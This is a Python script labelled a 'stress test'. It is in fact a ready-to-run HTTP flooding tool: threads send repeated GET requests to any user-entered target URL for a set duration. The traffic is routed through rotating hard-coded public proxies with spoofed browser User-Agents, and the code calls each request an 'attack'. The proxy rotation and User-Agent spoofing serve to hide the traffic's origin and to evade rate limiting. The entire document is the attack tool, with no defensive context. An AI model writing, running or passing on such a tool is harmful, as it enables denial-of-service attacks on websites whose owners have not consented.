import requests
import threading
import random
import time
from itertools import cycle

# Load proxy list from a file or online source
def get_proxies():
    url = "https://www.free-proxy-list.net/"
    # Here you can scrape or use an API to fetch proxies
    return [
        "http://45.77.67.96:8080",
        "http://144.217.101.245:3128",
        "http://51.79.50.31:9300"
    ]

# Rotating User-Agent list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

def stress_test(target_url, duration=60, threads=10):
    proxies = get_proxies()
    proxy_pool = cycle(proxies)
    end_time = time.time() + duration
    
    def attack():
        while time.time() < end_time:
            try:
                proxy = next(proxy_pool)
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                response = requests.get(target_url, proxies={"http": proxy, "https": proxy}, headers=headers, timeout=5)
                print(f"[{response.status_code}] Attack sent via {proxy}")
            except Exception as e:
                print(f"Error with {proxy}: {e}")
    
    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()
        threads_list.append(thread)
    
    for thread in threads_list:
        thread.join()

# Example Usage
if __name__ == "__main__":
    target = input("Enter target URL: ")
    duration = int(input("Enter attack duration (seconds): "))
    threads = int(input("Enter number of threads: "))
    stress_test(target, duration, threads)
